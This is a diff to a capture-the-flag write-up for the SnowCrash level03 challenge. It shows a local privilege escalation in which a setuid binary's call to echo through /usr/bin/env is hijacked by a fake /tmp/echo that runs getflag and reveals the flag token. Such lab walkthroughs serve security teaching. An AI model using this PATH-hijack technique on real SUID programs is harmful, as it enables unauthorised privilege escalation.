@@ -7,6 +7,10 @@ d--x--x--x 1 root    users    340 Aug 30  2015 ..
 -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
 -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
 -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+
+#Notice the important part in the rights of level03. It uses suid which is a massive danger and this is out gate way into the system. It shares
+user rights with us and will allow us to use the getflag command.
+
 we see that we have an executable. we will run it and see what happens 
 evel03@SnowCrash:~$ ./level03 
 Exploit me
@@ -14,11 +18,11 @@ Exploit me
 we see that it prints out 'Exploit me'.
 So now we will do just that.
 
-if we look at the executable level03 in terms of what it uses. We can see that the binary use `/usr/bin/env 
+if we look at the executable level03 in terms of what strings shows us. We can see that the binary use `/usr/bin/env 
 		echo 'Exploit me' to print Exploit me we can change the location of echo with a fake one that will provide use
 		with the command getflag, because ./level03 does have the right of flag03 user
 
- using this exploit :
+ using the exploit od suid :
  we see that there os a getflag command
 level03@SnowCrash:~$ echo '/bin/get
 getfacl           getflag           get_mountoptions  
@@ -43,6 +47,7 @@ level03@SnowCrash:~$ echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 
 further read
+https://www.pentestpartners.com/security-blog/exploiting-suid-executables/
 https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail
 https://isc.sans.edu/forums/diary/Shellshock+A+Collection+of+Exploits+seen+in+the+wild/18725/
 https://ss64.com/bash/echo.html
